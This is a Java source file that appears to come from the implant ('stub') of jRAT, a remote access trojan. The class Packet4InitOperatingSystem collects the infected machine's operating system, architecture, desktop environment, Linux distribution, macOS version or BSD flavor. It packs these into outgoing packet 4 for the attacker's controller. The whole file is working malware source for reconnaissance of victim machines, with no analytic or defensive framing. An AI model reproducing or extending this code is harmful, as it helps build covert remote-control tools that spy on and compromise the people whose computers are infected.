package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;
import oslib.AbstractOperatingSystem;
import oslib.Arch;
import oslib.DesktopEnvironment;
import oslib.OperatingSystem;
import oslib.bsd.BSDOperatingSystem;
import oslib.linux.LinuxOperatingSystem;
import oslib.macos.MacOSOperatingSystem;

public class Packet4InitOperatingSystem extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
		
		sw.writeLine(os.getType().getName());
		sw.writeLine(os.getDetailedString());
		sw.writeLine(Arch.getArch().getName());
		
		DesktopEnvironment de = os.getDesktopEnvironment();
		sw.writeLine(de.getSearch());	
		dos.writeBoolean(de.getVersion() != null);
		if (de.getVersion() != null) {
			sw.writeLine(de.getVersion());
		}
		
		if (os.getType() == OperatingSystem.LINUX) {
			LinuxOperatingSystem los = (LinuxOperatingSystem) os;
			sw.writeLine(los.getDistroSpec().getDistro().getName());
			
			String codename = los.getDistroSpec().getCodename();
			
			dos.writeBoolean(codename != null);
			if (codename != null) {
				sw.writeLine(codename);
			}
			
			String release = los.getDistroSpec().getRelease();
			
			dos.writeBoolean(release != null);
			if (release != null) {
				sw.writeLine(release);
			}
		} else if (os.getType() == OperatingSystem.MACOS) {
			MacOSOperatingSystem oos = (MacOSOperatingSystem) os;
			
			dos.writeBoolean(oos.getVersion() != null);
			
			if (oos.getVersion() != null) {
				sw.writeLine(oos.getVersion().getDisplay());
				sw.writeLine(oos.getVersion().getVersion());
			}
		} else if (os.getType() == OperatingSystem.BSD) {
			BSDOperatingSystem bos = (BSDOperatingSystem) os;
			sw.writeLine(bos.getFlavor().getName());
		}
	}

	@Override
	public short getPacketId() {
		return (byte) 4;
	}
}
